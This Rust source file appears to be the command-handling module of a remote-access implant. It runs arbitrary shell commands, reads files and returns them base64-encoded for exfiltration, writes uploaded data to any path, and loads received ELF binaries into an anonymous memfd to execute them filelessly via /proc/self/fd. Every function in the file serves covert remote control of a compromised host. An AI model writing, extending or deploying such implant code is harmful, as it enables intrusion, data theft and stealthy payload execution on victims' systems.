use crate::crypt::{b64_decode, b64_encode};
use std::fs;
use std::process::Command;
/// Execute a shell command and return its combined stdout+stderr output
pub fn exec_cmd(cmd: &str) -> String {
    let output = Command::new("sh").arg("-c").arg(cmd).output();

    match output {
        Ok(out) => {
            let mut result = String::from_utf8_lossy(&out.stdout).to_string();
            let stderr = String::from_utf8_lossy(&out.stderr).to_string();
            if !stderr.is_empty() {
                if !result.is_empty() {
                    result.push('\n');
                }
                result.push_str(&stderr);
            }
            if result.is_empty() {
                result = "(no output)".to_string();
            }
            result
        }
        Err(e) => format!("Error: {}", e),
    }
}

/// Read a file and return it as {'filename':'...','size':N,'content':'<b64>'}
pub fn handle_download(path: &str) -> String {
    let path = path.trim();
    match fs::read(path) {
        Ok(bytes) => {
            let filename = std::path::Path::new(path)
                .file_name()
                .and_then(|n| n.to_str())
                .unwrap_or("file");
            let content_b64 = b64_encode(&bytes);
            format!(
                "{{'filename':'{}','size':{},'content':'{}'}}",
                filename,
                bytes.len(),
                content_b64
            )
        }
        Err(e) => format!("Error: {}", e),
    }
}

/// Write base64-encoded content to a path on disk
/// Expected value format: "<path>:<base64data>"
pub fn handle_upload(value: &str) -> String {
    let sep = match value.find(':') {
        Some(pos) => pos,
        None => return "Error: invalid upload format, expected <path>:<base64data>".to_string(),
    };

    let path = value[..sep].trim();
    let b64_data = value[sep + 1..].trim();

    let decoded = match crate::crypt::b64_decode(b64_data) {
        Ok(d) => d,
        Err(e) => return format!("Error: base64 decode failed: {}", e),
    };

    match fs::write(path, &decoded) {
        Ok(_) => format!("Uploaded {} bytes to {}", decoded.len(), path),
        Err(e) => format!("Error: {}", e),
    }
}

pub fn handle_elf_exec(value: &str) -> String {
    let content_b64 = extract_quoted(value, "'content':");
    let args_b64 = extract_quoted(value, "'args':");

    let elf_bytes = match b64_decode(&content_b64) {
        Ok(b) => b,
        Err(e) => return format!("Error: base64 decode failed: {}", e),
    };

    if elf_bytes.len() < 4 || &elf_bytes[..4] != b"\x7fELF" {
        return "Error: invalid ELF magic".to_string();
    }

    let args_str = b64_decode(&args_b64)
        .map(|b| String::from_utf8_lossy(&b).to_string())
        .unwrap_or_default();

    // Create anonymous memfd (no MFD_CLOEXEC so the child inherits it)
    let fd = unsafe { libc::syscall(libc::SYS_memfd_create, b".\0".as_ptr(), 0i64) } as i32;

    if fd < 0 {
        return "Error: memfd_create failed".to_string();
    }

    let written = unsafe {
        libc::write(
            fd,
            elf_bytes.as_ptr() as *const libc::c_void,
            elf_bytes.len(),
        )
    };

    if written as usize != elf_bytes.len() {
        unsafe { libc::close(fd) };
        return "Error: write to memfd failed".to_string();
    }

    let exe_path = format!("/proc/self/fd/{}", fd);
    let args: Vec<&str> = args_str
        .split_whitespace()
        .filter(|s| !s.is_empty())
        .collect();

    let output = std::process::Command::new(&exe_path).args(&args).output();

    unsafe { libc::close(fd) };

    match output {
        Ok(out) => {
            let mut result = String::from_utf8_lossy(&out.stdout).to_string();
            let stderr = String::from_utf8_lossy(&out.stderr).to_string();
            if !stderr.is_empty() {
                if !result.is_empty() {
                    result.push('\n');
                }
                result.push_str(&stderr);
            }
            if result.is_empty() {
                result = "(no output)".to_string();
            }
            result
        }
        Err(e) => format!("Error: exec failed: {}", e),
    }
}

fn extract_quoted(src: &str, key: &str) -> String {
    let start = match src.find(key) {
        Some(p) => p + key.len(),
        None => return String::new(),
    };
    let after = &src[start..];
    let q1 = match after.find('\'') {
        Some(p) => p + 1,
        None => return String::new(),
    };
    let rest = &after[q1..];
    let q2 = match rest.find('\'') {
        Some(p) => p,
        None => return rest.to_string(),
    };
    rest[..q2].to_string()
}
